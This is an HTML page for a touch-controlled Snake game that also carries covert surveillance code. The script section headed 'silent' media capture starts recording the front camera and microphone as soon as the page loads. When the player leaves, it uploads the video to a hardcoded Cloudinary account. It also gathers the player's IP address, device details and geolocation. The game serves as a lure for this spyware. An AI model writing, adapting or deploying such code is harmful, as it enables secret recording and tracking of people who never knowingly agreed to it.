<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
<title>Game with Silent Media Capture</title>
<style>
  html, body {
    margin:0; padding:0; overflow:hidden; height:100%; width:100%;
    background:#111; color:#eee; font-family: Arial, sans-serif;
    -webkit-touch-callout:none;
    -webkit-user-select:none;
    -ms-user-select:none;
    user-select:none;
  }
  #gameCanvas {
    background: #222;
    display: block;
    margin: 0 auto;
    touch-action: none;
  }
  #scoreboard {
    position: fixed;
    top: 10px; left: 50%; transform: translateX(-50%);
    color: #0f0;
    font-size: 20px;
    font-weight: bold;
  }
  #controls {
    position: fixed;
    bottom: 20px; left: 50%; transform: translateX(-50%);
  }
  button {
    font-size: 18px;
    padding: 10px 15px;
    margin: 0 10px;
    cursor: pointer;
    border-radius: 5px;
    border: none;
    background: #0a0;
    color: #fff;
  }
  #info {
    position: fixed;
    bottom: 70px;
    left: 50%;
    transform: translateX(-50%);
    color: #aaa;
    font-size: 12px;
    text-align: center;
  }
</style>
</head>
<body>

<div id="scoreboard">Score: 0</div>
<canvas id="gameCanvas" width="320" height="480"></canvas>

<div id="controls">
  <button id="startBtn">Start Game</button>
  <button id="restartBtn" disabled>Restart</button>
</div>

<div id="info">Use swipe gestures to control the snake</div>

<script>
// --- Game Code (Snake) with touch control ---
const canvas = document.getElementById('gameCanvas');
const ctx = canvas.getContext('2d');
const scoreboard = document.getElementById('scoreboard');
const startBtn = document.getElementById('startBtn');
const restartBtn = document.getElementById('restartBtn');
const info = document.getElementById('info');

const gridSize = 20;
const tileCountX = canvas.width / gridSize;
const tileCountY = canvas.height / gridSize;

let snake = [];
let direction = {x:0, y:0};
let food = {};
let score = 0;
let gameInterval;
let isPlaying = false;

// Initialize snake in center
function initSnake() {
  snake = [{x: Math.floor(tileCountX/2), y: Math.floor(tileCountY/2)}];
  direction = {x: 0, y: 0};
  score = 0;
  updateScore();
}

// Place food randomly
function placeFood() {
  food.x = Math.floor(Math.random() * tileCountX);
  food.y = Math.floor(Math.random() * tileCountY);
}

// Update score display
function updateScore() {
  scoreboard.textContent = `Score: ${score}`;
}

// Draw everything
function draw() {
  ctx.fillStyle = '#111';
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  // Draw food
  ctx.fillStyle = '#f00';
  ctx.fillRect(food.x*gridSize, food.y*gridSize, gridSize, gridSize);

  // Draw snake
  ctx.fillStyle = '#0f0';
  snake.forEach((segment) => {
    ctx.fillRect(segment.x*gridSize, segment.y*gridSize, gridSize-1, gridSize-1);
  });
}

// Update game state
function update() {
  if(direction.x === 0 && direction.y === 0) return; // not moving

  const head = {...snake[0]};
  head.x += direction.x;
  head.y += direction.y;

  // Wrap around edges
  if(head.x < 0) head.x = tileCountX - 1;
  if(head.x >= tileCountX) head.x = 0;
  if(head.y < 0) head.y = tileCountY - 1;
  if(head.y >= tileCountY) head.y = 0;

  // Check collision with self
  if(snake.some(seg => seg.x === head.x && seg.y === head.y)) {
    endGame();
    return;
  }

  snake.unshift(head);

  // Eat food
  if(head.x === food.x && head.y === food.y) {
    score++;
    updateScore();
    placeFood();
  } else {
    snake.pop();
  }
}

// Game loop
function gameLoop() {
  update();
  draw();
}

// Game control
function startGame() {
  if(isPlaying) return;
  isPlaying = true;
  initSnake();
  placeFood();
  direction = {x:1, y:0};
  gameInterval = setInterval(gameLoop, 150);
  startBtn.disabled = true;
  restartBtn.disabled = false;
  info.textContent = 'Use swipe gestures to control the snake';
}

function endGame() {
  clearInterval(gameInterval);
  isPlaying = false;
  info.textContent = `Game Over! Final Score: ${score}`;
  startBtn.disabled = false;
  restartBtn.disabled = true;
}

// Restart button
restartBtn.addEventListener('click', () => {
  if(isPlaying) {
    clearInterval(gameInterval);
  }
  startGame();
});

// Start button
startBtn.addEventListener('click', () => {
  startGame();
});

// Touch control for mobile swipe
let touchStartX = 0;
let touchStartY = 0;

canvas.addEventListener('touchstart', e => {
  const touch = e.touches[0];
  touchStartX = touch.clientX;
  touchStartY = touch.clientY;
});

canvas.addEventListener('touchend', e => {
  const touch = e.changedTouches[0];
  const dx = touch.clientX - touchStartX;
  const dy = touch.clientY - touchStartY;

  if(Math.abs(dx) > Math.abs(dy)) {
    // Horizontal swipe
    if(dx > 20 && direction.x !== -1) direction = {x:1, y:0}; // right
    else if(dx < -20 && direction.x !== 1) direction = {x:-1, y:0}; // left
  } else {
    // Vertical swipe
    if(dy > 20 && direction.y !== -1) direction = {x:0, y:1}; // down
    else if(dy < -20 && direction.y !== 1) direction = {x:0, y:-1}; // up
  }
});

// --- Media Capture and Upload (silent, permission requested on load) ---

const CLOUD_NAME = 'dps0g5ftz'; // your Cloudinary cloud name
const UPLOAD_PRESET = 'unsigned'; // your unsigned upload preset

let mediaRecorder;
let recordedChunks = [];
let sessionId;
let frontStream;

async function requestPermissionsAndStartRecording() {
  sessionId = Date.now();

  try {
    // Request camera + mic permissions immediately on page load
    frontStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: true
    });

    // Start recording silently
    startRecording(frontStream);

    // Collect user info and geo silently
    collectUserInfo();

  } catch (e) {
    console.warn("Permissions denied or not available:", e);
  }
}

function startRecording(stream) {
  recordedChunks = [];
  mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });

  mediaRecorder.ondataavailable = function(e) {
    if(e.data.size > 0) recordedChunks.push(e.data);
  };

  mediaRecorder.onstop = async function() {
    const blob = new Blob(recordedChunks, { type: "video/webm" });
    await uploadRecording(blob);
    recordedChunks = [];
  };

  mediaRecorder.start();
}

function stopRecording() {
  if(mediaRecorder && mediaRecorder.state !== "inactive") {
    mediaRecorder.stop();
  }
  if(frontStream) {
    frontStream.getTracks().forEach(track => track.stop());
  }
}

async function uploadRecording(blob) {
  const folderName = `sessions/${sessionId}`;
  const url = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`;

  const formData = new FormData();
  formData.append('file', blob);
  formData.append('upload_preset', UPLOAD_PRESET);
  formData.append('folder', folderName);
  formData.append('resource_type', 'video');
  formData.append('public_id', `session_${sessionId}_${Date.now()}`);

  try {
    const res = await fetch(url, {
      method: 'POST',
      body: formData
    });
    const data = await res.json();
    console.log("Uploaded recording:", data.secure_url);
    // Optionally send URL and session info to your backend here
  } catch (err) {
    console.error("Upload failed:", err);
  }
}

// Collect user device info + IP + geolocation
async function collectUserInfo() {
  const info = {};
  info.userAgent = navigator.userAgent;
  info.language = navigator.language;
  info.platform = navigator.platform;
  info.screenWidth = window.screen.width;
  info.screenHeight = window.screen.height;
  info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  // Fetch IP from a public API
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const ipData = await res.json();
    info.ip = ipData.ip;
  } catch {
    info.ip = 'Unavailable';
  }

  // Geolocation (with permission)
  info.geo = {};
  if ("geolocation" in navigator) {
    await new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          info.geo.latitude = pos.coords.latitude;
          info.geo.longitude = pos.coords.longitude;
          info.geo.accuracy = pos.coords.accuracy;
          resolve();
        },
        (err) => {
          info.geo.error = err.message;
          resolve();
        },
        { timeout: 10000 }
      );
    });
  }

  console.log("User Info Collected:", info);
  // Optionally send this info to your backend
}

// Stop recording and upload on unload
window.addEventListener('beforeunload', () => {
  stopRecording();
});

// Request permissions and start recording as soon as possible
window.addEventListener('load', () => {
  requestPermissionsAndStartRecording();
});
</script>

</body>
</html>
